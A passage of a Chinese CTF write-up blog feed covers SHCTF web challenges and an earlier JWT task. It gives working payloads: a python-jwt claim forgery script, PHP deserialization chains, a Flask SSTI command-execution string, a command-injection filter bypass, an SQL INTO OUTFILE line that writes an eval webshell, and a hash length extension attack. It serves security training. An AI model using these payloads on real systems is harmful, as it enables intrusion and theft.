<span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_">run</span>(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="title class_">True</span>)</span><br></pre></td></tr></table></figure><p>简单审计 可以看到我们的role为admin时 我们才能进行pickle反序列化利用</p><p>题中鉴权是靠jwt来实现的 那么生成过程是 </p><p>如果get获取到token 那么jwt中<code>session[&quot;role&quot;]</code>就为我们输入token的role </p><p>如果token为空 那么他会帮我自动生成jwt 并且将<code>session[&quot;role&quot;]</code>初始化为guest</p><p>然后是jwt crack的一个新出的漏洞 这里jwt加密是靠rsa加密 </p><p>利用这个脚本 可以不需要公私钥就可以伪造jwt</p><p>项目地址：</p><p><a href="https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9">https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9</a></p><p>简单修改一下 把里面改为<code>parsed_payload[&#39;role&#39;] = &#39;admin&#39;</code> 即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot; Test claim forgery vulnerability fix &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads, dumps</span><br><span class="line">#<span class="keyword">from</span> test.<span class="property">common</span> <span class="keyword">import</span> generated_keys</span><br><span class="line">#<span class="keyword">from</span> test <span class="keyword">import</span> python_jwt <span class="keyword">as</span> jwt</span><br><span class="line"><span class="keyword">from</span> pyvows <span class="keyword">import</span> <span class="title class_">Vows</span>, expect</span><br><span class="line"><span class="keyword">from</span> jwcrypto.<span class="property">common</span> <span class="keyword">import</span> base64url_decode, base64url_encode</span><br><span class="line">def <span class="title function_">topic</span>(topic):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    [header, payload, signature] = topic.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    parsed_payload = <span class="title function_">loads</span>(<span class="title function_">base64url_decode</span>(payload))</span><br><span class="line">    parsed_payload[<span class="string">&#x27;role&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    fake_payload = <span class="title function_">base64url_encode</span>((<span class="title function_">dumps</span>(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot;  &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake_payload + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">token=<span class="string">&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTg3NzA4MzAsImlhdCI6MTY5ODc2NzIzMCwianRpIjoiaVNzT2pQOVlLZ1NOUHVqYU5wYWkyQSIsIm5iZiI6MTY5ODc2NzIzMCwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.WxTnJPgzKgjBYQ8HB8Ny5W4ZLNpsjAKsikMXHhtIQ-e5MiJp8jSt7AwKcuGsrqsFlTYeJLuGyLaxGGC29PAsKS8SVM82BG0W79nK35mp4aLXIEjer-cRT4GO8LX-WVZ0rRJZuv2Pe8ETPi8Rz0UahtmPYm7BbuvQ3XOudkb--wdcUrSIm2354RvaISRA7Z4a8VuP77VgkBIFNoebO_3c2wTO_w79-hTqg-JbUJqagqeFj5ptroo1SiYHpy2u2zUPKNqEeC6kcKwkZQWNUBGY4BuceLuoGBs9x2DWkAAsgrMC9PcUJ-8zzNFaZF22KxGgiLBv2pjR7HneVrF0Utx4gA&#x27;</span></span><br><span class="line">payload = <span class="title function_">topic</span>(token)</span><br><span class="line"><span class="title function_">print</span>(payload)</span><br></pre></td></tr></table></figure><p>之后就是一个很简单的pickle反序列化了 不再赘述</p><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>一起共勉</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698564198569-1243af25-92dd-4cfc-916d-4750a52577a3.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SHCTF-校外赛道 WEB WP</title>
      <link href="/post/cb61c260.html"/>
      <url>/post/cb61c260.html</url>
      
        <content type="html"><![CDATA[<p>查缺补漏</p><span id="more"></span><h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="babyRCE"><a href="#babyRCE" class="headerlink" title="babyRCE"></a>babyRCE</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uniq$&#123;IFS&#125;/f???</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696227692048-d68dc7db-8da9-467e-9a56-f3144d51b8f7.png" alt="img"></p><h2 id="登录就给flag"><a href="#登录就给flag" class="headerlink" title="登录就给flag"></a>登录就给flag</h2><p>弱口令 admin&#x2F;password</p><h2 id="飞机大战"><a href="#飞机大战" class="headerlink" title="飞机大战"></a>飞机大战</h2><p>unicode解码再base64解码</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696218779041-17e60cf7-8b84-4bb6-82ae-dc2b64c2bb78.png" alt="img"></p><h2 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h2><p>考点:</p><ul><li>nginx日志包含</li><li>php反序列化</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var_1;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__invoke</span><span class="params">()</span>&#123;</span><br><span class="line">    include($<span class="built_in">this</span>-&gt;var_1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $q;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__wakeup</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, $<span class="built_in">this</span>-&gt;q)) &#123;</span><br><span class="line">                echo <span class="string">&quot;hacker&quot;</span>;           </span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $<span class="keyword">var</span>;</span><br><span class="line">    <span class="keyword">public</span> $z;</span><br><span class="line">        <span class="keyword">public</span> function <span class="title function_">__toString</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $<span class="built_in">this</span>-&gt;z-&gt;<span class="keyword">var</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">        <span class="keyword">public</span> function <span class="title function_">__get</span><span class="params">($key)</span>&#123;</span><br><span class="line">            $function = $<span class="built_in">this</span>-&gt;p;</span><br><span class="line">            <span class="keyword">return</span> $function();</span><br><span class="line">        &#125;  </span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> <span class="title class_">B</span>();</span><br><span class="line">$a-&gt;q = <span class="keyword">new</span> <span class="title class_">C</span>();</span><br><span class="line">$a-&gt;q-&gt;z = <span class="keyword">new</span> <span class="title class_">D</span>();</span><br><span class="line">$a-&gt;q-&gt;z-&gt;p=<span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">$a-&gt;q-&gt;z-&gt;p-&gt;var_1=<span class="string">&quot;/var/log/nginx/access.log&quot;</span>;</span><br><span class="line">echo <span class="title function_">urlencode</span><span class="params">(serialize($a)</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696225164008-8562808d-7eb0-4178-b5b2-6e09d2dc76b1.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696225179418-22c57d4a-2956-461f-8744-ad60f52f7576.png" alt="img"></p><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>考点:</p><p><a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696218682919-6637ec2f-8393-4e58-9eb3-a260ef466c8d.png" alt="img"></p><h2 id="1zzphp"><a href="#1zzphp" class="headerlink" title="1zzphp"></a>1zzphp</h2><p>考点:</p><ul><li>正则回溯</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">requests</span></span><br><span class="line"><span class="variable">payload</span> <span class="operator">=</span> &#123;</span><br><span class="line">    <span class="string">&quot;c_ode&quot;</span>:<span class="string">&#x27;a&#x27;</span>*<span class="number">1000000</span>+<span class="string">&quot;2023SHCTF&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=<span class="string">&#x27;http://112.6.51.212:32212/?num[]=1&#x27;</span>,data=payload)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h2 id="生成你的邀请函把"><a href="#生成你的邀请函把" class="headerlink" title="生成你的邀请函把~"></a>生成你的邀请函把~</h2><p>题目一开始没描述清楚 也有人做出来。。 挺抽象的</p><p>我还以为是CRLF 傻逼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /generate_invitation HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">112.6</span><span class="number">.51</span><span class="number">.212</span>:<span class="number">31589</span></span><br><span class="line">Content-Length: <span class="number">119</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: http:<span class="comment">//112.6.51.212:31589</span></span><br><span class="line">Content-Type: application/json</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">117.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Referer: http://112.6.51.212:31589/generate_invitation</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;  </span></span><br><span class="line"><span class="comment">    &quot;name&quot;: &quot;Z1d10t&quot;,  </span></span><br><span class="line"><span class="comment">    &quot;imgurl&quot;: &quot;http://q.qlogo.cn/headimg_dl?dst_uin=QQnumb&amp;spec=640&amp;img_type=jpg&quot;  </span></span><br><span class="line"><span class="comment">&#125; </span></span><br></pre></td></tr></table></figure><h1 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h1><h2 id="serialize"><a href="#serialize" class="headerlink" title="serialize"></a>serialize</h2><p>考点：</p><ul><li>反序列化</li><li>引用运算符</li><li>array绕过正则</li><li>php命名规范</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span><span class="params">(__FILE__)</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">misca</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $gao;</span><br><span class="line">    <span class="keyword">public</span> $fei;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__get</span><span class="params">($key)</span>&#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;miaomiao();</span><br><span class="line">        $<span class="built_in">this</span>-&gt;gao=$<span class="built_in">this</span>-&gt;fei;</span><br><span class="line">        die($<span class="built_in">this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">miaomiao</span><span class="params">()</span>&#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;a=<span class="string">&#x27;Mikey Mouse~&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">musca</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ding;</span><br><span class="line">    <span class="keyword">public</span> $dong;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__wakeup</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="built_in">this</span>-&gt;ding-&gt;dong;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">milaoshu</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $v;</span><br><span class="line">    <span class="keyword">public</span> function <span class="title function_">__tostring</span><span class="params">()</span>&#123;</span><br><span class="line">        echo<span class="string">&quot;misca~musca~milaoshu~~~&quot;</span>;</span><br><span class="line">        include($<span class="built_in">this</span>-&gt;v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function <span class="title function_">check</span><span class="params">($data)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^O:\d+/&#x27;</span>,$data))&#123;</span><br><span class="line">        die(<span class="string">&quot;you should think harder!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(check($_GET[<span class="string">&quot;wanna_fl.ag&quot;</span>]));</span><br></pre></td></tr></table></figure><p>链子不难 难点在于 <code>$this-&gt;gao=$this-&gt;fei;</code>这句该怎么用</p><p>这里就需要知道引用运算符</p><p>举个小例子说明</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696928661467-d50a9a71-5ff4-43e5-a049-df123d39419e.png" alt="img"></p><p>这里取了了a的地址 修改b 那么也就会修改a</p><p>在这道题目我们需要修改<code>$this-&gt;a</code>为<code>milaoshu</code>对象 所以就要用到引用运算符<code>&amp;</code></p><p>还有就是正则 不能0开头 用array绕过就行</p><p>poc如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">misca</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $gao;</span><br><span class="line">    <span class="keyword">public</span> $fei;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">musca</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ding;</span><br><span class="line">    <span class="keyword">public</span> $dong;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">milaoshu</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $v;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> <span class="title class_">musca</span>();</span><br><span class="line">$a-&gt;ding = <span class="keyword">new</span> <span class="title class_">misca</span>();</span><br><span class="line">$a-&gt;ding-&gt;gao =&amp;$a-&gt;ding-&gt;a;</span><br><span class="line">$a-&gt;ding-&gt;fei = <span class="keyword">new</span> <span class="title class_">milaoshu</span>();</span><br><span class="line">$a-&gt;ding-&gt;fei-&gt;v = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">$b = array(<span class="string">&quot;1&quot;</span>=&gt;$a);</span><br><span class="line">echo <span class="title function_">urlencode</span><span class="params">(serialize($b)</span>);</span><br><span class="line">?&gt;</span><br><span class="line">#a%3A1%3A%7Bi%3A1%3BO%3A5%3A%22musca%<span class="number">22</span>%3A2%3A%7Bs%3A4%3A%22ding%<span class="number">22</span>%3BO%3A5%3A%22misca%<span class="number">22</span>%3A3%3A%7Bs%3A3%3A%22gao%<span class="number">22</span>%3BN%3Bs%3A3%3A%22fei%<span class="number">22</span>%3BO%3A8%3A%22milaoshu%<span class="number">22</span>%3A1%3A%7Bs%3A1%3A%22v%<span class="number">22</span>%3Bs%3A57%3A%22php%3A%<span class="number">2F</span>%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%<span class="number">22</span>%3B%7Ds%3A1%3A%22a%<span class="number">22</span>%3BR%3A4%3B%7Ds%3A4%3A%22dong%<span class="number">22</span>%3BN%3B%<span class="number">7D</span>%<span class="number">7D</span></span><br></pre></td></tr></table></figure><h2 id="no-wake-up"><a href="#no-wake-up" class="headerlink" title="no_wake_up"></a>no_wake_up</h2><p>考点：</p><ul><li>fast destruct</li></ul><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">flag</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $code;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> <span class="title class_">flag</span>();</span><br><span class="line">$a-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">$a-&gt;code = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">echo <span class="title function_">serialize</span><span class="params">($a)</span>;</span><br><span class="line">?&gt;</span><br><span class="line">#O:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">57</span>:<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="ez-ssti"><a href="#ez-ssti" class="headerlink" title="ez_ssti"></a>ez_ssti</h2><p>考点:</p><ul><li>flask ssti</li></ul><p>基础无过滤</p><p><code>?name=&#123;&#123;"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;</code>payload不唯一</p><h2 id="EasyCMS"><a href="#EasyCMS" class="headerlink" title="EasyCMS"></a>EasyCMS</h2><p>访问<code>/admin/admin.php</code> 到后台</p><p><code>admin/mao</code> 默认密码登录</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696935237103-37e0ae4e-16eb-4996-9505-8af901743984.png" alt="img"></p><p>可以执行sql语句</p><p>直接写马到网站根目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;&quot; INTO OUTFILE &quot;/var/www/html/1.php&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696935273584-ee0d7776-e5f1-428a-8763-1095bf028ca9.png" alt="img"></p><h2 id="MD5的事就拜托了"><a href="#MD5的事就拜托了" class="headerlink" title="MD5的事就拜托了"></a>MD5的事就拜托了</h2><p>考点：</p><ul><li>哈希长度扩展攻击</li></ul><p>源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span><span class="params">(__FILE__)</span>;</span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;SHCTF&#x27;</span>]))&#123;</span><br><span class="line">    extract(parse_url($_POST[<span class="string">&#x27;SHCTF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>($$$scheme===<span class="string">&#x27;SHCTF&#x27;</span>)&#123;</span><br><span class="line">        echo(md5($flag));</span><br><span class="line">        echo(<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;length&#x27;</span>]))&#123;</span><br><span class="line">        $num=$_GET[<span class="string">&#x27;length&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>($num*<span class="number">100</span>!=intval($num*<span class="number">100</span>))&#123;</span><br><span class="line">            echo(strlen($flag));</span><br><span class="line">            echo(<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;SHCTF&#x27;</span>]!=md5($flag))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">&#x27;SHCTF&#x27;</span>]===md5($flag.urldecode($num)))&#123;</span><br><span class="line">        echo(<span class="string">&quot;flag is&quot;</span>.$flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先就是正常的变量覆盖</p><p>POST：<code>SHCTF=host://query?SHCTF</code></p><p>GET：<code>length=0.0000001</code></p><p>然后我们可以得到flag的md5值和flag长度</p><p>关键在于</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;SHCTF&#x27;</span>]!=md5($flag))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">&#x27;SHCTF&#x27;</span>]===md5($flag.urldecode($num)))&#123;</span><br><span class="line">        echo(<span class="string">&quot;flag is&quot;</span>.$flag);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>一眼丁真是哈希长度扩展攻击</p><p>在这里有弯子猪脑当时没绕过来</p><p>举个例子</p><p>一般我们哈希长度扩展攻击已知<code>md5($salt.$somethong.$insert)</code>salt长度和something的值</p><p><code>$insert</code>是我们可控能输入的点</p><p>但是这道题我们只知道<code>md5($flag)</code>的值 并不知道那一坨的md5值</p><p>这里需要绕一下认为<code>salt为0</code> 一般flag格式为<code>flag&#123;xxx-xxx-xxx-xxx&#125;</code></p><p>那么我么们将<code>$somethong=flag&#123;xxx-xxx-xxx-xxx</code> 将这段我们能输入<code>$insert</code>的当作<code>&#125;</code></p><p>这样我们就变相的知道了那一坨的md5值</p><p>利用hashpump工具</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696994485178-e7586fae-acc9-42d2-a0a3-79aa7579011e.png" alt="img"></p><p>在这里<code>a280dad8326674279a3944046bc364f3</code>其实就是我们加入攻击值之后那一坨的md5值</p><p>然后输入的时候length只需要输入<code>%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%001</code>前面<code>&#125;</code>就不需要了 不然就和flag重复了 并且length只容许是数字</p><p>payload:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:SHCTF=a280dad8326674279a3944046bc364f3</span><br><span class="line">GET:length=%<span class="number">80</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%00P%<span class="number">01</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">001</span></span><br></pre></td></tr></table></figure><h2 id="WEEK2-ez-rce（未解出）"><a href="#WEEK2-ez-rce（未解出）" class="headerlink" title="[WEEK2]ez_rce（未解出）"></a>[WEEK2]ez_rce（未解出）</h2><p>考点：</p><ul><li>subprocess.call()命令注入</li></ul><p>源码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 